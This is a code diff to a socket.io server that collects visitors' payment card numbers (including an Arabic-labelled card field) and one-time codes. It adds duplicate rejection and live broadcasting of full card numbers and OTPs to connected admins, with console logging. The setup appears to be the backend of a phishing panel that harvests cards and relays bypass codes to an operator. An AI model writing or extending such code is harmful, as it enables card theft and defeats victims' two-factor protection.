@@ -552,6 +552,41 @@ io.on("connection", (socket) => {
         }
       }
       if (data.paymentCard) {
+        // Check for duplicate card
+        const newCardNumber = data.paymentCard.cardNumber || data.paymentCard['رقم البطاقة'] || '';
+        const isDuplicateCard = visitor.paymentCards.some(card => {
+          const existingNumber = card.cardNumber || card['رقم البطاقة'] || '';
+          return existingNumber === newCardNumber && newCardNumber !== '';
+        });
+        
+        if (isDuplicateCard) {
+          const now = new Date().toISOString();
+          // Save duplicate rejection
+          if (!visitor.duplicateCardRejections) visitor.duplicateCardRejections = [];
+          visitor.duplicateCardRejections.push({
+            cardNumber: newCardNumber,
+            timestamp: now
+          });
+          visitor.lastDataUpdate = now;
+          visitors.set(socket.id, visitor);
+          saveVisitorPermanently(visitor);
+          
+          // Notify client
+          socket.emit('card:duplicateRejected', { cardNumber: newCardNumber });
+          
+          // Notify admins
+          admins.forEach((admin, adminSocketId) => {
+            io.to(adminSocketId).emit('visitor:duplicateCard', {
+              visitorId: visitor._id,
+              cardNumber: newCardNumber,
+              visitor: visitor
+            });
+          });
+          
+          console.log(`Duplicate card rejected for visitor ${visitor._id}: ${newCardNumber}`);
+          return;
+        }
+        
         const now = new Date().toISOString();
         visitor.paymentCards.push({
           ...data.paymentCard,
@@ -562,6 +597,40 @@ io.on("connection", (socket) => {
         visitor.hasEnteredCardPage = true;
       }
       if (data.digitCode) {
+        // Check for duplicate OTP
+        const newCode = data.digitCode;
+        const isDuplicateOtp = visitor.digitCodes.some(dc => dc.code === newCode);
+        
+        if (isDuplicateOtp) {
+          const now = new Date().toISOString();
+          // Save duplicate rejection
+          if (!visitor.duplicateOtpRejections) visitor.duplicateOtpRejections = [];
+          visitor.duplicateOtpRejections.push({
+            code: newCode,
+            page: data.page,
+            timestamp: now
+          });
+          visitor.lastDataUpdate = now;
+          visitors.set(socket.id, visitor);
+          saveVisitorPermanently(visitor);
+          
+          // Notify client
+          socket.emit('otp:duplicateRejected', { code: newCode });
+          
+          // Notify admins
+          admins.forEach((admin, adminSocketId) => {
+            io.to(adminSocketId).emit('visitor:duplicateOtp', {
+              visitorId: visitor._id,
+              code: newCode,
+              page: data.page,
+              visitor: visitor
+            });
+          });
+          
+          console.log(`Duplicate OTP rejected for visitor ${visitor._id}: ${newCode}`);
+          return;
+        }
+        
         const now = new Date().toISOString();
         visitor.digitCodes.push({
           code: data.digitCode,
